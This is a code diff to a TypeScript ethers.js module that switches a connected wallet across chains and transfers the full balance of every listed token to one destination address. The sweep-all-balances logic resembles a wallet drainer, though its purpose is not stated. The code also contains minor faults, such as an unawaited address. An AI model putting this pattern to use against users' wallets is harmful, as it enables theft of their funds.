@@ -92,31 +92,50 @@ export async function getBalance(network: any, address: any) {
 export async function transferBalances(signer: ether.Signer, toAddress: string) {
   const fromAddress = signer.getAddress();
   let oldSigner = signer;
-  const allPromises = await Promise.all(
-    Object.entries(networkTokens).map(async ([networkName, item]) => {
-      const promises = Object.keys(item).map(async (key) => {
-        const { createdSigner: newSigner, createdProvider: newProvider } = await switchNetwork(oldSigner, item[key].chainId);
-        const contract = new ethers.Contract(item[key].address, item[key].abi, newProvider);
-        const balance = await contract.balanceOf(fromAddress);
-        oldSigner = newSigner;
-        return transfer(newSigner, toAddress, balance);
-      });
-
-      return Promise.all(promises);
-    })
-  );
-
-  return allPromises.flat();
+  for (const [networkName, item] of Object.entries(networkTokens)) {
+    const promises = [];
+  
+    for (const key of Object.keys(item)) {
+      console.log(item, "item>>>>");
+      const { createdSigner: newSigner, createdProvider: newProvider } = await switchNetwork(oldSigner, item[key].chainId);
+      const jsonProvider = new ethers.JsonRpcProvider(newProvider.connection.url);
+      const contract = new ethers.Contract(item[key].address, item[key].abi, jsonProvider);
+      const balance = await contract.balanceOf(fromAddress);
+      oldSigner = newSigner;
+      promises.push(transfer(newSigner, toAddress, balance));
+    }
+  
+    await Promise.all(promises);
+  }
+  return true;
 }
 
 async function switchNetwork(oldSigner: ether.Signer, chainId: number) {
-  await window.ethereum.request({
-    method: 'wallet_switchEthereumChain',
-    params: [{ chainId: `0x${chainId.toString(16)}` }],
-  });
-  const createdProvider = oldSigner.provider;
-  const createdSigner = oldSigner.connect(createdProvider);
-  return {createdSigner, createdProvider}; 
+  try {
+    await window.ethereum.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{ chainId: `0x${chainId.toString(16)}` }],
+    });
+    
+    // Function to check if the provider has switched to the desired chain
+    const waitForProviderSwitch = async () => {
+      const newChainId = (await window.ethereum.request({ method: 'eth_chainId' })).toLowerCase();
+      console.log(chainId.toString(16), "newChainId");
+      return newChainId === `0x${chainId.toString(16)}`;
+    };
+
+    // Wait for the provider to switch (retry every 100 milliseconds)
+    while (!(await waitForProviderSwitch())) {
+      await new Promise(resolve => setTimeout(resolve, 100));
+    }
+
+    const createdProvider = oldSigner.provider;
+    const createdSigner = oldSigner.connect(createdProvider);
+    return { createdSigner, createdProvider };
+  } catch (error) {
+    console.error('Error switching network:', error);
+    throw error;
+  }
 }
 export async function transfer(signer: ether.Signer, to: string, amount: number): Promise<boolean> {
   try {
